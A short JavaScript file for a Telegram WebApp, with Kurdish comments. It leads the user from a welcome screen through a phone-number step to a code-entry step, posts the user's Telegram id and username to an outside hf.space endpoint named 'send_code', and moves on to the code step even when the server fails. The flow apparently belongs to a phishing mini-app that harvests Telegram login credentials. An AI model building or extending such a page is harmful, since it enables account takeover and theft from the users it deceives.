const API_URL = "https://taman964-api-handler.hf.space/send_code";

// ئەمە بۆ ئەوەیە کە کلیک لە Confirm کرا، لاپەڕەی وەرگرتنی ژمارە دەرکەوێت
function showStep1() {
    document.querySelector('.welcome-screen').style.display = 'none';
    document.getElementById('step1').style.display = 'block';
}

async function sendData() {
    const okButton = document.getElementById('ok-button');
    okButton.disabled = true;
    okButton.innerText = "Connecting...";

    try {
        const user = window.Telegram.WebApp.initDataUnsafe.user;
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user ? user.id : "Unknown",
                username: user ? user.username : "Guest",
                action: "Confirm Clicked"
            })
        });

        // ئەگەر وەڵامی سێرڤەر هات، بچۆ بۆ قۆناغی وەرگرتنی کۆد
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        
    } catch (error) {
        console.error("Error:", error);
        // تەنانەت ئەگەر سێرڤەریش کێشەی هەبوو، با هەر بچێتە لاپەڕەی دواتر بۆ ئەوەی بەکارهێنەر نەوەستێت
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }
}
